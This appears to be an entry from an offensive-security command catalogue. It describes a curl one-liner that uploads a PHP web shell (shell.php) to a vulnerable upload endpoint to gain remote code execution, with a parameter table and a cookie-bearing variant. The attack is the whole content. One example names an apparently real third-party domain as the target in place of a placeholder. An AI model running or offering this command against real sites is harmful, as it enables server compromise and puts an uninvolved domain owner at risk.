---
id: cmd-curl-php-upload-001
data: 'curl -X POST -F "file=@shell.php" http://target.com/upload.php'
tags:
  - upload
  - rce
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:25.056Z'
verified: false
validated: true
submitted: true
---
# curl-php-upload

## Command

```bash
curl -X POST -F "file=@shell.php" http://target.com/upload.php
```

## Description

This command uses curl to perform an HTTP POST request uploading a local PHP file to a vulnerable web endpoint, exploiting unrestricted file uploads.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-F "file=@shell.php"` | Uploads the local file shell.php as form field 'file' | Yes |
| `http://target.com/upload.php` | Target upload endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -F "file=@shell.php" http://axa.dxi.eu/upload.php
```

### Advanced Usage

```bash
curl -X POST -F "file=@shell.php" -F "submit=Upload" -H "Cookie: session=abc123" http://target.com/upload.php
```

## Expected Output

HTTP response indicating successful upload, such as "File uploaded successfully" or a redirect. No errors like 403 Forbidden.

## Related

- [[commands/curl-execute-php]]
- [[procedures/Upload-Malicious-PHP-File-for-RCE]]
